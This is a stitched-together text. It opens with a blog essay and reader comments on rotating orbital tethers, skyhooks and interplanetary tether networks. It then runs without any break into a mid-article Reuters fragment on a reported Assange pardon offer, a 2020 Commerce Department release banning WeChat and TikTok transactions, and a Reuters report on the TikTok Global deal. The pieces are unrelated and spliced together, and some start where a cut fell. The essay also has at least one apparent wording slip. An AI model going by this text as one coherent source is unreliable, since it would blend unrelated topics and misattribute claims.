As the tether collects and releases payloads, it must adjust the distribution of its mass to maintain its center of rotation.Adjusting the tether with a moving counterweight on a 'crawler'.This can be done by shifting the counterweight, moving additional masses up and down the tether, changing the length of the tether using motors and/or having a dynamic suspension system that also helps dampen vibrations. In later sections, we will go through the various ways tethers can be used and combined to cover the entire Solar System.SkyhookThe skyhook process from Hoyt.The most immediately beneficial application of an orbital tether is the form of a Skyhook. This is a well-studied concept that dips the tether tip as low and slow as possible into the upper atmosphere, so that a suborbital craft can catch up to it, rendezvous, transfer a payload and then fly away. Getting off Earth and into orbit is a massive task. It requires that over 9 km/s of deltaV be delivered in one chunk, by a high thrust propulsion system. Chemical rockets can do this, but they end up as balloons of fuel with a small payload on the tip.A skyhook can help reduce deltaV requirements where they are hardest to deliver: at the end of a tiresome fight against Earth’s gravity. Because of the exponential nature of the Tsiolkovsky rocket equation, the last 1 km/s of deltaV costs much more than the first 1 km/s. The savings enabled by a Skyhook are therefore disproportionately high.Imagine a 200 km long tether anchored to a station orbiting at 400 km altitude. Its tip speed is 2.4 km/s. This means it travels over the ground at 5.3 km/s at its lowest point, and swings above at 10.1 km/s.A rocket trying to catch up with this tether at its lowest point must deliver 5.3 km/s of horizontal velocity, but also about 1.5 km/s to reach a 200 km altitude as well as make up for drag and gravity losses on the way up. Its deltaV requirement becomes 6.8 km/s. With kerosene and oxygen propellants delivering an average Isp of 330s, it would need a mass ratio of 8.17. This is well within the reach of a single-stage vehicle, even with margins to return and land vertically for reuse. For comparison, a kerosene/oxygen-fuelled vehicle that must make orbit would need 9.5 km/s and a mass ratio of 18.8. It would need multiple stages and it would be difficult to create deltaV margins for recovery. The tether-assisted rocket is 2.76 times smaller and lighter for the same payload!But that’s not all.The tether swings around and launches its payload into a 400 x 35,800 km orbit. This is also known as a geostationary transfer orbit (GTO) - an orbit where a rocket would only need an extra 1.5 km/s to turn into a 35,800 x 35,800 km geostationary orbit.The tether’s top-side boost is worth another 2.4 km/s. If it has to be delivered by the same vehicle that must reach orbit on its own, deltaV requirements would add up to 11.9 km/s. With 330s Isp propulsion, this means a staggering mass ratio of 39.5. Modern rockets get around this by fitting their upper stages with more efficient rocket engines, but they still take a huge hit to their payload capabilities when launching to GTO instead of LEO. ULA’s Delta IV Heavy could launch 28 tons into LEO but only 14 tons into GTO.We could do better. A faster tether that dips deeper into the atmosphere is possible, further reducing the deltaV requirements for meeting it and reducing the constraints on the vehicle we use. HASTOL. We don't really want the plane to exit the atmosphere.The lowest a tether tip could reasonably go is 50 km in altitude, making it 200 km long if it orbited at 250 km altitude. It could be pushed up to 6 km/s in tip speed, bringing its tip to a mere 1.7 km/s relative to the ground at its lowest point and to 13.7 km/s at its highest point. We can call this design a ‘Hypertether', inspired by works like HASTOL.1.7 km/s corresponds to Mach 5 at this altitude. We have had aircraft reach these speeds and altitudes for decades, under rocket power. We have developed hypersonic scramjets that can sustain these speeds much more efficiently too. A large aircraft could meet a Hypertether using existing technologies reliably, without needing a lot of propellant or excessive thermal shielding. The exponential mass ratios that make rockets so expensive no longer come into play. Hypersonic rendezvous vehicles could climb to this altitude using engines with Isp exceeding 4000s (using hydrogen fuel), fly long enough to attempt multiple rendezvous with the tether (one attempt per tether rotation period) and land, ready to fly again within the hour.The downside to this approach is that the mass ratio of the tether itself becomes unwieldy. At 6 km/s, even T1100G tethers require a mass ratio of 379. The result is huge tethers in orbit needed to handle even the smallest of payloads. With a 200% safety margin, a 1 ton payload would need a 758 ton tether in these conditions. Launching such a mass into space and fitting it with an appropriately sized counterweight and anchor point would require hundreds of launches to break-even with the cost.A staged tether can get around some of these difficulties.Just like a rocket, a tether can be broken up into stages. Each stage uses the tip of the previous tether as its anchor point. If two 3 km/s tethers are staged, then they could achieve a combined 6 km/s tip velocity. However, each stage only needs a mass ratio of 6, with T1100G. A 1 ton payload would need 1x6: 6 ton first stage tether and a (1+6)x6 : 42 ton second stage tether. Add a 200% safety margin and it would still be an overall mass of 84 tons, which is much lower than the previous 758 tons for a single tether.Many difficulties must be overcome with this design. The first is the need to absorb any lateral movement which could cause tether sections to run into each other. The second is to create a stable joint that can operate under huge stresses. Using some of the mass savings from a staged tether design to alleviate these problems is recommended. Finally, each tether stage will be relatively short, leading to high centrifugal forces being imposed. If a 200 km long tether is divided into two 100 km sections, each rotating at 3 km/s, then payloads would be subjected to an acceleration varying between 9 and 18g. Much longer tethers would be needed for human travellers. Overcoming these difficulties would yield a flexible Hypertether with exceptional performance but low mass. A huge, slowly rotating skyhook would not look much different from a section of space elevator near the ground.The ideal skyhook, as originally conceived for science fiction, uses multiple stages so that its combined tether tip velocity matches its orbital velocity. It would become stationary relative to the ground with each rotation. This means a combined 7.7 km/s for a tether orbiting at 250 km altitude. No rendezvous vehicle is needed; payloads would simply sit on the ground and latch onto the descending hook from the sky.A huge number of additional challenges face this ‘perfect Skyhook’ design, ranging from the need to prevent unpredictable air turbulence from smashing tether stages into each other, to needing thermal protection for tethers that accelerate to multiple km/s while coming up through the thickest portions of the atmosphere.High performance skyhooks around Earth will mostly aim to lift payloads up from the ground and out into space. They are likely to run at a permanent momentum deficit; propulsion is essential. Obtaining propellant is an obstacle, as are the power requirements. The simplest solution is to sacrifice a portion of each payload using the tether to carry propellant. Low performance tethers that sit at high altitudes and with low tip velocities will make this a very expensive option. This is because they make rendezvous vehicles work hard to get to them. If a 1,000 ton tether station accelerated a 3 ton payload by 3 km/s from rendezvous to release, it would lose 9 m/s itself. Accelerating 1000 tons by 9 m/s using a 3,000s Isp engine requires about 305 kg of propellant. This means that, roughly, for every 9 payloads accelerated by the tether, a 10th launch is needed for refuelling. High performance tethers have it worse. They lose more momentum proportionally with each payload they accept, because of their higher tip speeds. Accelerating a 3 ton payload by 12 km/s slows down a 1,000 ton tether by 36 m/s, requiring 1,223 kg of propellant to recover! Thankfully, they make travel to space so much cheaper that sacrificing every third payload for propellant still makes for an overall saving over rockets.Extraterrestrial sources of propellant can be much more interesting. It normally takes less deltaV to move propellant from the Moon to LEO than it takes to move it up from the ground to LEO, at about 5.8 km/s vs 9.5 km/s. With aerobraking, the deltaV required to return from the Moon’s surface to Earth orbit is reduced to 2.8 km/s. Lunar sources of propellant remain interesting even when we adjust the deltaV requirements to account for the tether helping out. A tether with 3.1 km/s tip velocity would reduce the deltaV needed to lift off from Earth’s surface and enter into Low Earth Orbit to 6.4 km/s. It would also reduce the deltaV needed for a spaceship to launch off the Moon and enter Low Earth Orbit to 2.8 km/s. This keeps lunar sources of propellant the better option over terrestrial sources. Another advantage of extraterrestrial propellants for tethers is that capturing them ‘recharges’ the momentum of the tether. Catching 1 ton of propellant coming in at 3 km/s would accelerate a 1,000 ton tether by 3 m/s. Using that propellant for a 3,000s Isp thruster would further accelerate it by 29 m/s. That propellant is worth 10% more than expected!The absolute best propellant source of Skyhooks around Earth is the atmosphere itself. Atmospheric gas scooping is discussed in full detail here. A tether tip dipping into the atmosphere can ‘cheat’ the gas scooping retention equation by collecting gases at a lower velocity than the tether station’s orbital velocity. For example, a tether at 250 km altitude rotating at 3 km/s would collect gases at a velocity of 4.7 km/s. If a 3000s Isp engine running on nitrogen and oxygen is used, up to 84% of gases collected can be retained. The gases retained can then be fed to rockets using the tether, turning it into an orbital fuel depot.What’s more exciting is that it removes the restriction from the tether to have high Isp engines in the first place. They are bulky and power-hungry equipment. A tether that only aims to regain velocity would be satisfied with 0% gas retention. Lighter, simpler propulsion options like nuclear thermal rockets, with an Isp of just 480s, become acceptable. Alternatively, we could use hydrogen-oxygen chemical rocket where payloads coming up the tether provide 12% of the propellant and the remaining 88% is oxygen collected from the atmosphere.      Better than any propellant source is not having to use any propellant. This is important for very high altitude tethers that do not meet the atmosphere. Electrodynamic propulsion pushes off the magnetic field around Earth. It only consumes electricity. Although the thrust per kW is very low, it is a reliable and already tested option.Powering all these propulsion options is another concern. Ideally, a tether station would want a compact and long-duration power source like a nuclear reactor. Solar panels are also available, but they require hefty energy storage solutions from the periods where the tether is in the Earth’s shadow, and the drag from the exposed panels adds to the momentum loss over time. Between these two options is the possibility for beamed power. Whether it is from the ground or a space station far above, energy can be transmitted over microwaves or a laser beam to the tether station, where it is converted back to electricity with high efficiency. MoonhookFrom Hop David's excellent blog.Getting off the lunar surface and into orbit involves much lower velocities than on Earth. There is no atmosphere imposing a minimum orbital altitude either. For these reasons, there are many proposals to install a rotating tether around the Moon first.Such a Moonhook would only need a tip velocity of about 1.5 km/s when orbiting at a 400 km altitude. Because of the lower velocities involved, it can be very lightweight, and easy to transport into a lunar orbit from Earth. There would be no erosion from passing through gases, and it would only have to avoid lunar mountains (up to 6km high) when coming down. This tether can help transfer payloads to the lunar surface, but also to other interesting locations, such as the L1 or L2 Lagrange points. It could be the centerpiece of a cislunar economy, and unlike the ‘lunar elevator’ concept, it does have to extend across hundreds of thousands of km to be useful. Phobos elevator suggested here.Reasons for a moonhook also apply to other moons. Phobos is a popular destination for small moonhooks, enabling access to the martian surface for 2.14 km/s.It could relay work with a tether around Deimos to enable a zero-propellant transfer into and out of the martian system.Interplanetary trajectoriesAs mentioned in the previous section, tethers can easily fling payloads far beyond Earth. Here is a table of tether tip velocities needed to place payloads on Hohmann transfer trajectories to different planets:Injection DeltaV is the velocity increase in meters per second that the payload must receive to enter a trajectory that takes it near the destination. Another propulsion system is needed to actually slow down once it arrives. The mass ratio calculations are done for T1100G cables. You will notice that some destinations, like Mars or Venus, are well within the capabilities of reasonably sized tethers. Mercury or Ceres can be reached with very heavy tethers. Going beyond Jupiter strictly necessitates the use of staged tethers, with Neptune probably off-limits for an Earth-based tether.The DeltaV values listed above are for Hohmann trajectories. For the Outer Planets, minor increases in deltaV (8400 m/s instead of 8200 m/s for Uranus, for example) were selected to enable missions that took less than 10 years to perform. Tethers can speed up travel between planets, by entering payloads into higher energy trajectories. Here is another table showing how much travel times (in days) can be reduced by tethers with 4, 6 and 8 km/s tip velocities. Venus and Mars are the greatest beneficiaries of an extra boost from a faster tether. Mars sees up to 5 times shorter trips when using an 8 km/s tip velocity tether. When the injection deltaV becomes more demanding, the benefit is reduced. A good idea is to have spacecraft using tethers employ their own propulsion system. They can act as an additional ‘stage’ with their own mass ratio between propellant and payload. As we calculated before, staging massively reduces the difficulty of reaching a certain velocity.Here is an example:A spaceship using 450s Isp chemical rockets loads up 2 kg of fuel for each 1 kg of dry mass. This gives it a mass ratio of 3 and a total deltaV of 4850 m/s. It performs a rendezvous with a 6 km/s two-stage tether made out of T1100G cables. The first tether stage has a mass ratio of 12, to get a tip velocity of 3000 m/s and a 100% safety margin on top. The second tether stage also has a mass ratio of 12.The final mass ratio of this system is 3 x 12 x 12: 432. The final velocity of 10,850 m/s enables trips to Jupiter in as little as 325 days, or to Uranus in 1551 days. A two-stage tether that tries to achieve this velocity would have had a mass ratio of over 22,000, while a single stage tether would have needed a ridiculous 23.8 megatons of cables for each ton of spaceship. Working through calculations like these really helps highlight just how similar a tether stage and its characteristic velocity is to a rocket stage and its exhaust velocity.Tether trains and interplanetary networksA tether can hand over a payload to another tether. These tethers can be in different orbits, and have different tip velocities, so long as the relative velocity falls to zero during a rendezvous. Three interesting scenarios for tether handovers can be considered:-Exchange between circular orbitsA tether in a low orbit can fling a payload up to an altitude that intersects with a tether in a higher orbit. It is caught and further boosted from this higher orbit. Or, payloads can be sent down from the higher tether. Here is an illustrated example:It can work best when the higher tether is a geostationary space station, or these tethers are transporting payloads between different moons around a gas giant like Jupiter. The most interesting aspect is that the tethers can keep each other from losing momentum, so long as the masses they exchange are balanced. The lower tether is naturally larger, as it has to send payloads up with a greater velocity. It could set up a ‘train’ of many momentum-neutral exchanges with several tethers.-Exchange with eccentric orbitsIn this exchange, one of the tethers is in a low circular orbit and the second tether is in an eccentric orbit with the lowest point (the periapsis) intersecting the first tether’s orbit. Here is an illustrated example:The main advantage is that the tether’s own velocity is added to the boost it can provide a payload. Multiple tethers can be used in sequence, bridging the velocity gap between a tether in a low circular orbit and a very eccentric, near-escape orbit. Low Jupiter Orbit at 42 km/s and Jupiter Escape Velocity at 60 km/s are separated by an 18 km/s gap. Three tethers with tip velocities of 4.5 km/s can relay a payload between them. It does not have to be done all within the narrow window where tethers are all lined up at the lowest point of their respective trajectories. The transfer between orbits can be done one by one. The tether in the lowest orbit accelerates a payload at 4.5 km/s. It is received by a second tether with a tip velocity of 4.5 km/s. The combined boost is 9 km/s. This is done again, to reach a third tether station that is on a near-escape trajectory, with a periapsis velocity of just under 60 km/s. Any extra boost from this third tether would allow a payload to escape into interplanetary space. A full 4.5 km/s boost can put it on a trajectory that sends it all the way back to Earth.Using tethers like this will put the deep gravity well of Jupiter on the same level of accessibility as Mars or Venus. The energy-intensive transfer of crew or cargo up and out of Jupiter can be compensated for by slowing down equal masses of ‘junk’ such as iceball comets or discarded asteroids.We can also expand the use of ‘tether trains’ to interplanetary space. Stations orbiting the Sun on circular or eccentric orbits could pass payloads between them for ‘free’, so long as momentum exchanges are balanced. A tether attached to a small body, as envisioned here.These tethers can be anchored to asteroids, moons or mobile bases, much like the slow Aldrin Cycler concepts. Payloads can hop between tethers at these points gaining or losing velocity. A cycler station makes a trip between Earth and Mars on a regular orbit.Cyclers are most interesting as they perform orbits that take many years, but with tethers, they can send payloads between them much faster.Moving between cyclers in this manner can take on aspects of a train stopping between towns, especially if the cyclers gain large enough populations to become noteworthy destinations on their own. This can lead to a ‘Wild West’ aesthetic, or fulfil the need to visit new locations without having to cross interplanetary distances. A Solar System tethered togetherA switch in transport of payloads from expensive, slow, propellant-consuming rockets to rapid, low to zero-propellant tethers would have an outsized effect on human expansion into the Solar System.Human passengers will see great reductions in travel times. The combination of an initial boost from a tether, with deltaV provided by a spaceship’s propulsion system, will connect the Inner planets within a matter of weeks. Tethers provide the option to collect propellant more easily, which means those spaceships can afford to spend a lot more propellant than they otherwise could, in turn making travel even faster. Even the Outer planets could be reachable within a few months of travel time. That’s a great step up from multiple years. Enough perhaps to prevent distant colonies from becoming the destination for a ‘once-in-a-generation migration’.Cheaper, quicker travel for humans means that automation is not needed as much. Machinery doesn’t have to work for years on end without maintenance, as a repair crew could arrive regularly. A more mobile population means that space becomes open to less skilled, less experienced workers to fill in job positions wherever they appear, instead of every station or outpost having to rely on multi-skilled workers that can handle prolonged isolation. More people moving around means better chances that ‘extras’ like luxuries and personal services can be accommodated, improving living conditions and so on, in a positive feedback loop.Inert cargo will also benefit from tether transportation. High value goods can be exchanged quickly. A latest generation computer processor wouldn’t have to spend years being exposed to cosmic rays before it reaches a colony around Jupiter as an out-of-date and damaged product. Profits can be made on platinum ground metals a few weeks after they are mined; this means adventurous asteroid mining companies don’t have to hold onto cash reserves so that they can operate for months in between deliveries. They can be smaller, leaner and take more risks. On the other hand, larger payloads can be moved at the same speed with tethers for much less cost. An exchange between two tethers, one on Mars and one on Earth, can take the regular minimal-energy Hohmann trajectory. However, far less propellant would be needed (if any at all, with momentum-neutral exchanges). The payloads would not need any engines, heatshields or large cryogenic propellant tanks. With the use of tugs to maneuver the payloads into a rendezvous at either end, they won’t even need expensive guidance systems. Such cheap travel opens up many new possibilities. Asteroid mining usually considers elements like iron and aluminium to be ‘wastes’ as their value is too low to be worth moving around. Their only use would be at the site they are extracted from. This no longer has to be the case; a much larger fraction of an asteroid becomes exploitable. A beneficial side-effect is that accessing these low-value resources to build up a colony in a remote corner of the Solar System becomes even more affordable. Complete this scene with a spinning tether in the background.Large, slow payloads that can easily be outrun by tether-boosted spacecraft opens the door to piracy. A better transportation system helps with the methods discussed in these previous posts. A ‘pirate tether’ can fling spacecraft into intercepts with payloads in transit. Criminal ports would have higher performance tethers to catch diverted goods from odd angles and high velocities. This is especially useful for stealth craft that can use a tether to boost into a trajectory without announcing themselves, and don’t want to reveal the location of their safe haven by slowing down using rockets. Anything criminals can do, the military can do better. Tether boosts means warships are closer to targets than before. Reduced reliance on onboard propulsion for deltaV means that more mass can be dedicated to armor and weapons instead of propellant tanks. Also, as mentioned before, a secret network of tethers can be employed to move stealth craft around the Solar System. Munitions launched like this can be smaller and easier to hide too.   Further developmentsEverything mentioned so far is only the start of what is possible with tethers. The use of tethers as aerodynamic devices is under-explored.Their use and performance can be expanded over time, as new ideas appear or better technologies are matured.We could consider a hybrid of a stationary and rotating tether. A rotating hub could be installed at the lower end of a very long stationary tether. It would collect a payload and transfer it to another rotating tether at the upper end by climbing up a stationary segment. The main advantage of this hybrid tether is that it can greatly extend the use of small, low velocity rotating tethers, while also not having to fully cover the distance to the destination like a simple stationary tether would have to. Supermaterials can also be considered. Tethers don’t need carbon nanotubes to function, but they can make great use of them. The characteristic velocity of graphene (130 GPa strength, 2267 kg/m^3) is 10,709 m/s. A tether to payload mass ratio of 10 enables a tip velocity of 12.3 km/s. A staged tether can get this up to 24.3 km/s with a total mass ratio of 100. That’s enough to fling a payload out of Low Jupiter Orbit with one single tether, or enable trajectories from Earth to Mars in 34 days, or to Saturn in 360 days. Between two tethers, we could see velocity gains of over 50 km/s… the main limitation would become human endurance. Even with a 6g tolerance limit, a tether tip velocity of 24.3 km/s means a minimum tether length of 10,000 km to reduce centrifugal forces!Going further, tether transport networks can be tied into the Inter-Orbital Kinetic Energy Exchange networks for transporting and generating energy, described here. Tethers can set up the exchange of masses, or even convert them into electricity themselves by using an electrodynamic tether in reverse: instead of consuming electricity to push against a magnetic field, using the field to generate a current while braking against it.Finally note that we haven’t considered the Oberth effect and that tethers can exploit it. Sending a payload down into a gravity well before rapidly accelerating it gives it an extra boost that does not match the momentum lost by the tether. The faster the tether tip, the greater the effect.

Zuthal15 September 2020 at 15:12One small error: Where you meant to put the table of tether tip velocities for Hohmann transfers, you put the graph of tether mass ratio vs tether tip velocity again.And you are definitely right about short tethers not being good for manned spacecraft, due to the large acceleration - and multi-stage tethers probably aren't either unless they are *very* large, due to the quickly changing centrifugal acceleration.I've done some math on it, and for a single stage tether in Earth Orbit with the tip dipping to 50 km altitude at 1.5 km/s earth-relative velocity (to allow easy access by scramjet vehicles), if it is to be limited to 3 g acceleration, you'd need a tether length of ~1180 km, a tip velocity of ~5800 m/s, and the thing rotating about three times per hour. But of course the benefit is that that would give you 13 km/s tip velocity relative to earth at the top of the swing.If you want to limit acceleration to 1 g, the tether length grows to a bit over 2700 km, but tip velocity decreases slightly to 5120 m/s.Of course, neither is that feasible without nanomaterials - with T1100G, you have, with no margins, a mass ratio of 250 for the first, and of 90 for the second.Though this shows off very neatly the high dependence of mass ratio on velocity ratio - an almost threefold increase in mass ratio for less than a 15% increase in tip velocity.ReplyDeleteRepliesZuthal15 September 2020 at 15:25And of course, with nanomaterials it becomes more than feasible. Graphene's characteristic velocity allows for a mass ratio of 10, at a factor of safety of over 6 - something more characteristic of structural civil engineering rather than aerospace engineering.DeleteRepliesReplyMatter Beam15 September 2020 at 15:50Thanks for pointing out that mistake! It's been fixed now. The strange thing about their tethers is that their mass does not depend on their length. A shorter tether that has to handle the same loads as a longer tether will mass the same. However, shorter tethers are easier to control and they are less vulnerable to being hit by debris and micrometeorites.I would always recommend splitting a boost between multiple tethers to reduce g-loads and get an overall lower mass ratio (6 km/s from two tethers instead of one tether, for example), but lifting off Earth is a special case.DeleteRepliesReplyReplySpencer17 September 2020 at 18:59I know that you discussed the use of atmospheric scoops in combination with mid-high isp rockets on tethers designed to drop down into the atmosphere, but how feasible would that be for a low mass ratio tether? I guess the question I'm really trying to ask if how heavy a given tether would have to be, not to be strong enough to lift cargo, but in order to retain enough velocity to regenerate it's momentum. If a given tether only has a mass ratio of 10, would lifting a piece of cargo not significantly effect its orbital trajectory?ReplyDeleteRepliesMatter Beam18 September 2020 at 00:45Hi Spencer.You don't need to collect a large amount of propellant all at once to feed a high Isp engine. You can choose to carry only, let's say, 1 kg every cycle. A 50km long tether with a tip velocity of 3km/s would perform about one rotation every 105 seconds, giving you an average mass flow of 9.5 g/s. This is enough for a 4.1 MW, 3000s Isp engine to overcome the drag of a massive 100,000m^2 installation in Low Earth Orbit (200km altitude).This tether would need a relatively high mass ratio, but it is multiplying a very small mass to begin with, so the tether become manageable.DeleteRepliesReplyReplyMr. Tucker17 September 2020 at 20:30Do you intend to cover the tether catapult systems?ReplyDeleteRepliesMatter Beam18 September 2020 at 00:57I'm not sure what you mean by 'tether catapult' systems, but I will be expanding on this topic.DeleteRepliesReplyMr. Tucker19 September 2020 at 13:21Apologies! Should have been more precise...https://en.wikipedia.org/wiki/Momentum_exchange_tether#Tether_cable_catapult_systemIn summary: ""A tether cable catapult system is a system where two or more long conducting tethers are held rigidly in a straight line, attached to a heavy mass. Power is applied to the tethers and is picked up by a vehicle that has linear magnet motors on it, which it uses to push itself along the length of the cable. Near the end of the cable the vehicle releases a payload and slows and stops itself and the payload carries on at very high velocity.""Basically a combination of tether and mass driver. DeleteRepliesReplyMatter Beam20 September 2020 at 04:06I'll look into it.DeleteRepliesReplyReplykeira18 September 2020 at 03:46I am not sure of the math involved, but, I wonder whether you could take advantage of either the earth's magnetic field or atmospheric differences in charge at different heights to help power such devices.. just thinking of how spiders use static electricity to hurl themselves even across oceans... https://www.pbs.org/newshour/science/spiders-fly-on-the-currents-of-earths-electric-fieldReplyDeleteRepliesMatter Beam18 September 2020 at 15:01Yes, you can!Electrodynamic tethers can push against the Earth's magnetic field to either accelerate (while consuming electricity) or slow down (while generating electricity). Using atmospheric drag is less interesting as it can only slow you down. DeleteRepliesReplyReply123Nick18 September 2020 at 13:49Is it possible too weaponize tethers? maybe as a way too sustain slinging projectiles at enemies? ReplyDeleteRepliesMatter Beam18 September 2020 at 14:51Tethers do not make for good weapons. They are too slow, cannot really be aimed, are very predictable and very are vulnerable to damage.However, they can help with getting missiles and spacecraft into fighting positions more easily.

At the time, the White House called the assertion that Trump had tried to reach a deal with Assange “a complete fabrication and a total lie”.Slideshow ( 2 images )Rohrabacher said he had never spoken with the president about Assange, denied being sent on Trump’s behalf and said he was acting on his own when he offered to ask Trump for a pardon for Assange.Robinson said Rohrabacher’s offer was presented to Assange as a “win-win” solution that would allow Assange “to get on with his life” and in return would also politically benefit Trump.During the 2016 U.S. presidential campaign, WikiLeaks published a series of Democratic National Committee emails damaging to candidate Hillary Clinton. U.S. investigators have concluded that the emails were hacked by Russia as part of an effort to influence the election.The 2016 election leaks are not directly a part of the U.S. criminal case against Assange, which covers secret military and diplomatic documents published by WikiLeaks several years earlier.Russia has denied meddling in the 2016 election and Trump has denied that his campaign colluded with Moscow.Assange is fighting the U.S. extradition request, arguing that the Trump administration has brought charges against him for political reasons.In 2012, Assange took refuge in Ecuador’s London embassy to avoid extradition to Sweden where he was accused of sex crimes, which he denied and which were later dropped. After seven years, he was dragged from the embassy by British police in 2019.Reporting by Andrew MacAskill; Editing by Guy Faulconbridge, William Maclean and Peter GraffOur Standards: The Thomson Reuters Trust Principles.AppsNewslettersAdvertise with UsAdvertising GuidelinesCookiesTerms of UsePrivacyDo Not Sell My Personal InformationAll quotes delayed a minimum of 15 minutes.

          The .gov means it’s official.
          
          Federal government websites always use a .gov or .mil domain. Before sharing sensitive information online, make sure you’re on a .gov or .mil site by inspecting your browser’s address (or “location”) bar.
        
      
    
    
      
        This site is also protected by an SSL (Secure Sockets Layer) certificate that’s been signed by the U.S. government.

  Commerce Department Prohibits WeChat and TikTok Transactions to Protect the National Security of the United States



  


    
      
              Wilbur Ross
          
  
FOR IMMEDIATE RELEASE
      
            Friday, September 18, 2020

   In response to President Trump’s Executive Orders signed August 6, 2020, the Department of Commerce (Commerce) today announced prohibitions on transactions relating to mobile applications (apps) WeChat and TikTok to safeguard the national security of the United States. The Chinese Communist Party (CCP) has demonstrated the means and motives to use these apps to threaten the national security, foreign policy, and the economy of the U.S. Today’s announced prohibitions, when combined, protect users in the U.S. by eliminating access to these applications and significantly reducing their functionality. 

“Today’s actions prove once again that President Trump will do everything in his power to guarantee our national security and protect Americans from the threats of the Chinese Communist Party,” said U.S. Department of Commerce Secretary Wilbur Ross. “At the President’s direction, we have taken significant action to combat China’s malicious collection of American citizens’ personal data, while promoting our national values, democratic rules-based norms, and aggressive enforcement of U.S. laws and regulations.”

While the threats posed by WeChat and TikTok are not identical, they are similar. Each collects vast swaths of data from users, including network activity, location data, and browsing and search histories. Each is an active participant in China’s civil-military fusion and is subject to mandatory cooperation with the intelligence services of the CCP.  This combination results in the use of WeChat and TikTok creating unacceptable risks to our national security.

As of September 20, 2020, the following transactions are prohibited:

Any provision of service to distribute or maintain the WeChat or TikTok mobile applications, constituent code, or application updates through an online mobile application store in the U.S.;
	Any provision of services through the WeChat mobile application for the purpose of transferring funds or processing payments within the U.S.
As of September 20, 2020, for WeChat and as of November 12, 2020, for TikTok, the following transactions are prohibited:

Any provision of internet hosting services enabling the functioning or optimization of the mobile application in the U.S.;
	Any provision of content delivery network services enabling the functioning or optimization of the mobile application in the U.S.;
	Any provision directly contracted or arranged internet transit or peering services enabling the function or optimization of the mobile application within the U.S.;
	Any utilization of the mobile application’s constituent code, functions, or services in the functioning of software or services developed and/or accessible within the U.S.
Any other prohibitive transaction relating to WeChat or TikTok may be identified at a future date. Should the U.S. Government determine that WeChat’s or TikTok’s illicit behavior is being replicated by another app somehow outside the scope of these executive orders, the President has the authority to consider whether additional orders may be appropriate to address such activities. The President has provided until November 12 for the national security concerns posed by TikTok to be resolved. If they are, the prohibitions in this order may be lifted.

The notices for these actions will be posted on the Federal Register at approximately 8:45AM EDT on Friday, September 18, 2020.

Background:

On August 6, 2020, President Trump signed Executive Orders (E.O.) 13942, Addressing the Threat Posed by TikTok, and E.O. 13943, Addressing the Threat Posed by WeChat. In the E.O.s, the President determined that the apps capture vast swaths of information from U.S. users, leaving the data vulnerable to CCP access for nefarious purposes. Commerce, at the Direction of the President, was required to identify transactions within 45 days to protect national security and the private data of millions of people across the country. Today’s announced prohibitions fulfill the President’s direction and mitigate national security risks.

Top ByteDance U.S. investors, Oracle Corp and potentially Walmart Inc would hold at least a 60% stake in TikTok’s U.S. operations, the source said.White House Chief of Staff Mark Meadows said the situation was still fluid.“There’s no definite proposal that the president’s being asked to consider or reject at this point,” Meadows told reporters.Related CoverageTrump says TikTok deal could move 'quickly,' there are great optionsThe new company, dubbed TikTok Global, will have a majority of American directors, a U.S. chief executive and a security expert on the board, the source added. Oracle has agreed to eventually own a 20% stake in the company, according to the source. If Walmart also successfully negotiates acquiring a stake, its CEO, Doug McMillon, would get a seat on TikTok Global’s board, the source said.Trump said that his administration talked with Walmart and Oracle on Thursday but “nothing much has changed” regarding a deal.He added, without giving details, “I guess Microsoft is still involved.” Microsoft said on Sunday its offer for TikTok was rejected. Microsoft did not immediately respond to a request for comment on Thursday.“We’ll make a decision soon,” Trump said.An IPO of TikTok would be one of the technology sector’s biggest-ever stock market debuts, given that the app was recently valued by ByteDance investors at more than $50 billion. It would further reduce ByteDance’s stake in the company to appease U.S. officials who want to see the Chinese firm loosen its grip on the video app.The filing of the IPO would be on a U.S. stock exchange and could come in about a year, the sources said.Flags of China and U.S. are seen near a Bytedance logo in this illustration picture taken September 18, 2020. REUTERS/Florence Lo/IllustrationThere is no certainty over whether Trump will sign off on the agreement. It was also not immediately clear what assets TikTok Global would own beyond the app’s assets in the United States. ByteDance has offered to create 25,000 new U.S. jobs with TikTok headquartered in the United States as it seeks to win Trump’s blessing for a deal, Reuters has reported.It was also not clear whether ByteDance could present the deal to China as keeping majority ownership of TikTok. Chinese officials have said they do not want ByteDance to agree to a forced sale, and the company’s proposal to the White House this week called for it to retain majority ownership of TikTok.The board of TikTok Global would include a national security director, who will be approved by the U.S. and chair a security committee overseeing the protection of user data, according to a person familiar with the matter.The term sheet will grant Oracle the right to inspect TikTok’s source code and includes numerous provisions to ensure data security and requirement that all U.S. users data remains in the United States housed by Oracle, the source said.It is not clear what Oracle or Walmart will pay for a stake. Oracle, Walmart and Treasury did not immediately comment.Meadows said on Thursday that the administration is still looking at details of the deal and whether it meets national security thresholds. Meadows said if TikTok remains predominantly Chinese-run under the Oracle deal, that would not meet Trump’s objectives.CHINA APPROVALByteDance said on Thursday it would need China to approve the proposed deal with the White House, indicating how its bid to stave off a ban in the United States could be further complicated.As many as 40% of Americans back Trump’s threat to ban TikTok if it is not sold to a U.S. buyer, a Reuters/Ipsos national poll found last month. Among Republicans - Trump’s party - 69% said they supported the order, though only 32% expressed familiarity with the app.The White House has stepped up efforts to purge what it deems “untrusted” Chinese apps from U.S. digital networks. Beyond TikTok, Trump has also issued an order prohibiting transactions with Tencent Holding Ltd’s messenger app WeChat.Earlier this year, Chinese gaming company Beijing Kunlun Tech Co Ltd sold gay dating app Grindr, bought in 2016, for $620 million after CFIUS ordered its divestment.ByteDance acquired Shanghai-based video app Musical.ly - whose user base was largely American - for $1 billion in 2017 without seeking CFIUS approval, relaunching it as TikTok the following year. Reuters reported last year that CFIUS was investigating TikTok.Reporting by David Shepardson in Washington, D.C., Stephen Nellis in San Francisco and Echo Wang in New York; Additional reporting by Steve Holland in Mosinee, Wisconsin; Editing by Cynthia Osterman and Stephen CoatesOur Standards: The Thomson Reuters Trust Principles.AppsNewslettersAdvertise with UsAdvertising GuidelinesCookiesTerms of UsePrivacyDo Not Sell My Personal InformationAll quotes delayed a minimum of 15 minutes.

